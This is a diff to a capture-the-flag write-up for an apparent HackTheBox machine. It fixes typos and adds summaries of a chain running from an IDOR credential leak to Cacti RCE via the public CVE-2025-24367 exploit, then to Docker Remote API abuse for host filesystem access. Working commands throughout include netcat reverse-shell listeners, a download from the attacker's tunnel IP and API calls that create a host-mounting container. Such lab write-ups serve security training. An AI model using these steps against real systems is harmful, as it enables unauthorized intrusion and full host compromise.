@@ -1,3 +1,7 @@
+### Attack Path Summary
+
+IDOR → Credential Disclosure → Cacti RCE → Container Access → Docker API Abuse → Host Filesystem Mount → Administrator Flag
+
 ### 1.Reconnaissance
 
 Initial reconnaissance on the target 10.10.11.98
@@ -9,7 +13,8 @@ nmap -sCV -T4 -A <Target_IP> -o filename
 ![alt text](images/nmap.png)
 
 Port 80/tcp -- http service(nginx server)
-port 5985/tcp -- http service(Microsoft server)
+5985/tcp -- WinRM (Windows Remote Management)
+
 
 There is nothing fishy on the website.
 ![alt text](images/website.png)
@@ -32,11 +37,14 @@ Let's check it
 
 So according to the error message, 'token' parameter is missing.
 So, I just tried using token=0 in the url and it worked. 
-This is IDOR(Indirect Object References). It is a critical vulnerabilty , which will reveal senstive information.
+This is an IDOR (Insecure Direct Object Reference) vulnerability.. It is a critical vulnerabilty , which will reveal sensitive information.
+
 ![alt text](images/data.png)
 
 The backend failed to validate token ownership or enforce authorization checks, allowing arbitrary token values (including 0) to return sensitive user data.
+
 Passwords are hashed using MD5.
+Since the passwords were hashed using unsalted MD5, they were vulnerable to fast dictionary-based cracking using public hash databases.
 We can crack them using crackstation.net.
 
 ![alt text](images/crackstation.png)
@@ -55,14 +63,13 @@ ffuf -u http://monitorsfour.htb -H "Host: FUZZ.monitorsfour.htb" -w /usr/share/d
 
 Add it to /etc/hosts file (cacti.monitorsfour.htb).
 
-
 ![alt text](images/cacti.png)
 
 We are now on login page. Let's try to login with cedentials we got before.
 Username: admin
 Password: wonderful1
 
-However this didnot succeed, indicating the username doesnot match.
+However this did not succeed, indicating the username doesnot match.
 Using the additional profile information exposed by the API, specifically the administrator's name Marcus Higgins and email address, I tested a small set of plausible username variations.
 
 After a few attempts, authentication was successful using the following credentials: 
@@ -73,12 +80,13 @@ Password: wonderful1
 
 ## Vulnerability Identification
 
-We can see the cacti version being displayed ion bith login page and dashboard. This narrowed the scope for vulnerability search.
+We can see the cacti version being displayed in both login page and dashboard. This narrowed the scope for vulnerability search.
 
 ![alt text](images/dashboard.png)
 
 A review of known issues affecting this version revealed CVE-2025-24367, a critical vulnerability impacting Cacti versions ≤ 1.2.28. 
-This flaw allows remote code execution (RCE) through command injection in the Graph Template functionality. The root cause is improper sanitization of user-supplied input that is ultimately passed to the rrdtool utility, enabling attackers to inject and execute arbitrary system commands.
+
+This vulnerability allows authenticated users to achieve remote code execution through command injection in the Graph Template functionality due to improper sanitization of user-supplied input passed to rrdtool.
 
 ## Exploit Preparation
 
@@ -88,10 +96,10 @@ with a confirmed vulnerable cacti version and poc available, I prepared the expl
 git clone https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC
 cd CVE-2025-24367-Cacti-PoC
 ```
-This repository contains a ready to use explot targeting CVE-2025-24367.
+This repository contains a ready to use exploit targeting CVE-2025-24367.
 
 
-Before using thee explot start a listner on port 4444
+Before using the exploit start a listner on port 4444
 ## Remote Code Execution
 
 Setup a listner on port 4444 to catch an incoming reverse shell.
@@ -99,7 +107,7 @@ Setup a listner on port 4444 to catch an incoming reverse shell.
 ```bash
 nc -lnvp 4444
 ```
-Now execute the public prrof-of-concept exploit from the cloned repository. You can check the syntax for it the repository.
+Now execute the public proof-of-concept exploit from the cloned repository. You can check the syntax for it the repository.
 
 ```bash
 sudo python3 exploit.py -url http://cacti.monitorsfour.htb -u marcus -p wonderful1 -i 10.10.14.145 -l 4444
@@ -119,13 +127,13 @@ After gaining shell on the target, I first confirmed the context of my access. R
 whoami
 id
 ```
-I then enumreated the /home directory to identify valid local userson the system. This revelead a hme directory for  user 'marcus', which aligned the credentials previously used to access the Cacti application.
+I then enumereated the /home directory to identify valid local userson the system. This revealed a home directory for  user 'marcus', which aligned the credentials previously used to access the Cacti application.
 
 ```bash
 la -la /home
 ```
-Futher navigating into the /home/marcus direcory revelead user.txt file. This file is world-readable.
-Reading the contents of the file user.txt successfully revelead the user flag.
+Futher navigating into the /home/marcus directory revealed user.txt file. This file is world-readable.
+Reading the contents of the file user.txt successfully revealed the user flag.
 ![alt text](images/user.png)
 
 ### Privilege Escalation
@@ -140,7 +148,7 @@ These indicators confirm that the current shell is operating inside a Docker con
 
 ![alt text](images/privilege1.png)
 
-Since the shell was running inside a Docker container, I proceeded to inspect /etc/reslov.conf. In containerised environment, this is file is automatically generated by docker engine and defines the DNS resolver used by the container. Inspecting this file is a standard enumeraton step, ai it often reveals the internal network configuration and may disclose the host-side IP address used by Docker. This information can be leveraged to guide internal network enumeration and identify potential container escape paths.
+Since the shell was running inside a Docker container, I proceeded to inspect /etc/reslov.conf. In containerised environment, this is file is automatically generated by docker engine and defines the DNS resolver used by the container. Inspecting this file is a standard enumeraton step, as it often reveals the internal network configuration and may disclose the host-side IP address used by Docker. This information can be leveraged to guide internal network enumeration and identify potential container escape paths.
 
 The resolver configuration revealed the Docker host IP (192.168.65.7), which became a natural target for further service enumeration.
 
@@ -151,7 +159,7 @@ Since unauthenticated Docker APIs have historically been exposed on TCP port 237
 To check whether the Docker Engine Remote API was exposed on the host, I issued the following request from within the container:
 
 ```bash
-curl http://192.168.65.7/version
+curl http://192.168.65.7:2375/version
 ```
 ![alt text](images/docker-api.png)
 
@@ -210,14 +218,14 @@ curl http://tun-ip:8000/container.json -o container.json
 curl -H "Content-Type: application/json" -d @container.json http://192.168.65.7:2375/containers/create?name=pwned
 ```
 
-Start a listner on port 9999.
+Start a listener on port 9999.
 ```bash
 nc -lnvp 9999
 ```
 Now start the container and we will recieve call back on it.
 
 ``bash
-curl -X POST http:///192.168.65.7:2375/containers/pwned/start
+curl -X POST http://192.168.65.7:2375/containers/pwned/start
 ```
 By abusing the Docker Remote API, I obtained arbitrary filesystem access to the Windows host via a bind mount.
 
@@ -229,3 +237,9 @@ cat /host_root/Users/Administrator/Desktop/root.txt
 ```
 ![alt text](images/root.png)
 
+### Root Cause Summary
+
+- Insecure Direct Object Reference exposing administrator credentials
+- Outdated Cacti version vulnerable to authenticated RCE
+- Application running inside a Docker container
+- Unauthenticated Docker Remote API exposed on the host
